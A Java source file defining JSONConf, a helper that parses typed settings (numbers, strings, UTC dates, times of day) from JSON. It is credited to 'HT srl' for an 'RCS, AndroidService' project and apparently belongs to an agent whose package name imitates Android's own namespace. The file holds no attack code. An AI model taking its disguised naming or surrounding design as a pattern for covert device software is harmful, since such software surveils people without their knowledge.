/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : RunningConf.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.conf;

import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;

import org.json.JSONException;
import org.json.JSONObject;

import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;

/**
 * Interface used by AgentConf and EventConf
 * 
 * @author zeno
 * 
 */
public abstract class JSONConf {
	private static final String TAG = "JSONConf";

	protected String type;

	/** Parameters. */
	private final JSONObject params;

	public JSONConf(String type, JSONObject params) {
		this.params = params;
		this.type = type;

	}

	public String getType() {
		return type;
	}

	public int getInt(String key) throws ConfigurationException {
		try {
			return params.getInt(key);
		} catch (JSONException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (getInt) Error: " + e);
			}

			throw new ConfigurationException();
		}
	}

	public double getDouble(String key) throws ConfigurationException {
		try {
			return params.getDouble(key);
		} catch (JSONException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (getInt) Error: " + e);
			}

			throw new ConfigurationException();
		}
	}

	public String getString(String key) throws ConfigurationException {
		try {
			return params.getString(key);
		} catch (JSONException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (getInt) Error: " + e);
			}

			throw new ConfigurationException();
		}
	}

	public String getString(String key, String defaultValue) {
		try {
			return getString(key);
		} catch (ConfigurationException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getString), default: " + defaultValue);
			}
			return defaultValue;
		}
	}

	public Date getDate(String key) throws ConfigurationException {
		String dateToParse;
		try {
			dateToParse = (String) params.get(key);
		} catch (JSONException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getDate) Error: " + e);
			}

			throw new ConfigurationException();
		}

		if (dateToParse.length() == 18) {
			dateToParse = dateToParse.substring(0, 11) + "0" + dateToParse.substring(11);
		}

		if ("0000-00-00 00:00:00".equals(dateToParse)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getDate): null date");
			}
			return new Date(Long.MAX_VALUE);
		}

		Date formatter;
		try {
			DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
			dateFormat.setTimeZone(TimeZone.getTimeZone("UTC"));

			formatter = dateFormat.parse(dateToParse);
		} catch (ParseException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getDate): ");
			}
			throw new ConfigurationException();
		}

		return formatter;

	}

	public Date getDate(String key, Date defValue) {
		try {
			return getDate(key);
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getDate): default");
			}
			return defValue;
		}
	}

	public int getSeconds(String key) throws ConfigurationException {
		// "13:45:00"
		String dateToParse;
		try {
			dateToParse = (String) params.get(key);

		} catch (JSONException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getSeconds) Error: " + e);
			}

			throw new ConfigurationException();
		}

		int hourlen = 2;
		if (dateToParse.length() == 7) {
			hourlen = 1;
		}

		try {
			int hour = Integer.parseInt(dateToParse.substring(0, hourlen));
			int minutes = Integer.parseInt(dateToParse.substring(hourlen + 1, hourlen + 3));
			int seconds = Integer.parseInt(dateToParse.substring(hourlen + 4, hourlen + 6));

			return hour * 3600 + minutes * 60 + seconds;
		} catch (NumberFormatException ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getSeconds) Error: " + ex);
			}
			throw new ConfigurationException();
		}

	}

	public boolean getBoolean(String key) throws ConfigurationException {
		try {
			return params.getBoolean(key);
		} catch (JSONException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (getInt) Error: " + e);
			}

			throw new ConfigurationException();
		}
	}

	public boolean getBoolean(String key, boolean defValue) {
		try {
			return params.getBoolean(key);
		} catch (Exception e) {
			return defValue;
		}
	}

	public String getArrayString(String key, String subkey) throws ConfigurationException {
		try {
			JSONObject hash = params.getJSONObject(key);
			return hash.getString(subkey);
		} catch (JSONException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (getInt) Error: " + e);
			}

			throw new ConfigurationException();
		}
	}

	public String getSafeString(String key) {
		try {
			return params.getString(key);
		} catch (JSONException e) {
			return null;
		}
	}

	public ChildConf getChild(String child) {
		JSONObject c = null;
		try {
			c = params.getJSONObject(child);
		} catch (JSONException e) {

		}

		ChildConf conf = new ChildConf(c);
		return conf;
	}

	public boolean has(String name) {
		return params.has(name);
	}

	@Override
	public String toString() {
		return params.toString();
	}
}
